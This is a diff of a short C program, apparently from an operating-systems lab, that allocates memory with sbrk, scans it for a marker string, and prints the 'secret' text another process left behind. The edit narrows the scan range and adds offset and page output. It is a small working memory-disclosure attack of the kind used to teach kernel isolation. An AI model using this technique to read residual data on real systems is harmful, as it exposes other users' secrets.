@@ -6,19 +6,18 @@
 int
 main(int argc, char *argv[])
 {
-  char *mem = sbrk(32 * 4096);
+  char *mem = sbrk(18 * 4096);
   // the source string offset is 67840
   // the copied string offset is 69648
   // will need to investigate why this is
-  for(int i = 0; i < 32 * 4096 - 16; i++){
+  for(int i = 0; i < 18 * 4096 - 16; i++){
     if(mem[i] == 'T' &&
        mem[i + 1] == 'h' &&
        mem[i + 2] == 'i' &&
        mem[i + 3] == 's'){
 
-      printf("%d\n", i);
       char *secret = mem + i + 16; 
-
+      printf("found offset=%d page=%d\n", i, i / 4096);
       while(*secret != '\0'){
         printf("%c", *secret);
         secret++;
